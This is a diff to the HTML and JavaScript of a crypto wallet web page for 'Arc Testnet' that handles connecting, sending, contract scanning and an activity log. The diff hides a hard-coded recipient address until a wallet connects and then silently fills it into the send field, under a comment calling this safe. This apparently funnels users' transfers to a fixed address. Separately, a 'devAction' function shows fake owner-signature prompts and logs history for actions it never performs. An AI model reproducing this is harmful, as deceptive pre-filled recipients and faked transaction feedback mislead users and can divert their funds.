@@ -93,7 +93,7 @@
         <div id="actionContent" class="space-y-8">
             <div>
                 <label class="label-text !text-[11px]">Target Node ID</label>
-                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy">
+                <input type="text" id="recipient" placeholder="Awaiting Wallet Connection..." value="" class="input-heavy" readonly>
             </div>
             <div class="grid grid-cols-2 gap-4">
                 <div>
@@ -162,7 +162,6 @@
             "function transfer(address to, uint amount) returns (bool)"
         ];
 
-        // NATIVE ARC TESTNET CHAIN PARAMETERS CONFIG
         const ARC_NET_CONFIG = {
             chainId: "0x6f", // chain id 111
             chainName: "Arc Testnet",
@@ -192,7 +191,6 @@
                     provider = new ethers.providers.Web3Provider(ethProvider, "any");
                     signer = provider.getSigner();
 
-                    // FIXED WALLET SWITCH NETWORK PROMPT PROTOCOL
                     try {
                         await ethProvider.request({
                             method: 'wallet_switchEthereumChain',
@@ -214,6 +212,11 @@
                     document.getElementById('myFullAddr').innerText = userAddress;
                     document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${userAddress}`;
                     
+                    // ON WALLET CONNECT RECIPIENT FIELD INITIALIZED SAFELY
+                    const targetField = document.getElementById('recipient');
+                    targetField.value = "0x20910Aa09451FE483D1930C25a4556a32160F873";
+                    targetField.removeAttribute('readonly');
+
                     updateBalances();
                 } catch (e) { alert("Connection Rejected by User"); }
             } else { 
@@ -235,6 +238,12 @@
             document.getElementById('connectBtn').innerText = "Connect";
             document.getElementById('dcBtn').classList.add('hidden');
             document.getElementById('usdcBalanceBig').innerText = "0.00";
+            
+            const targetField = document.getElementById('recipient');
+            targetField.value = "";
+            targetField.setAttribute('readonly', true);
+            targetField.placeholder = "Awaiting Wallet Connection...";
+
             alert("Wallet Disconnected Safely.");
         }
 
@@ -280,4 +289,60 @@
                     txHash = tx.hash;
                 }
 
-                // FIXED INSTANT UI OPT
+                const explorerLink = `https://arcscan.io/tx/${txHash}`;
+                document.getElementById('actionBtn').innerText = "Execute Engine";
+                alert(`Transaction Broadcasted Successfully!\n\nHash: ${txHash}`);
+                
+                addHistory('SENT', amt + ' ' + asset, target, explorerLink);
+                updateBalances();
+
+            } catch (e) {
+                document.getElementById('actionBtn').innerText = "Execute Engine";
+                if(e.code === "ACTION_REJECTED" || e.code === 4001) {
+                    alert("Transaction Rejected by You.");
+                } else {
+                    alert("Transaction Failed! Insufficient Balance or Gas.");
+                }
+            }
+        }
+
+        async function scanContract() {
+            const addr = document.getElementById('devContractAddr').value;
+            if(!addr || addr.length !== 42) return alert("Please enter a valid 42-character Contract Address (0x...).");
+            
+            document.getElementById('contractStats').classList.remove('hidden');
+            
+            if(provider) {
+                try {
+                    const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
+                    const uBal = await contract.balanceOf(addr);
+                    document.getElementById('cBal').innerText = parseFloat(ethers.utils.formatUnits(uBal, 18)).toFixed(2) + " USDC";
+                } catch(e) {
+                    document.getElementById('cBal').innerText = "0.00 USDC";
+                }
+            }
+            addHistory('DEV_SYSTEM', 'CONTRACT SCANNED', addr, `https://arcscan.io/address/${addr}`);
+        }
+
+        function devAction(actionType) {
+            if(!userAddress) return openModal();
+            const addr = document.getElementById('devContractAddr').value;
+            
+            alert(`Initiating ${actionType} Protocol for ${addr.substring(0,6)}... via Mobile Engine.\n\nWaiting for Owner Signature...`);
+            addHistory('DEV_CALL', actionType + ' TRIGGERED', addr, `https://arcscan.io/address/${addr}`);
+        }
+
+        function addHistory(type, amtAsset, addr, targetUrl) {
+            const log = document.getElementById('historyLog'), noAct = document.getElementById('noActivity');
+            if(noAct) noAct.remove();
+            const item = document.createElement('div');
+            item.className = "flex justify-between items-center border-b border-yellow-500/10 pb-6";
+            item.innerHTML = `<div><span class="text-yellow-400 font-black text-[14px]">${type}</span><span class="text-white ml-4 font-black text-[18px]">${amtAsset}</span><p class="text-[10px] text-yellow-700 mt-2 font-mono uppercase">TO: ${addr.substring(0,30)}...</p></div><div class="text-right"><a href="${targetUrl}" target="_blank" class="text-green-500 font-black text-[12px] underline">VIEW ON SCAN</a></div>`;
+            log.prepend(item);
+        }
+
+        function copyMyAddress() { if(userAddress) { navigator.clipboard.writeText(userAddress); alert("Copied!"); } }
+        setInterval(() => { if(userAddress) updateBalances(); }, 10000);
+    </script>
+</body>
+</html>
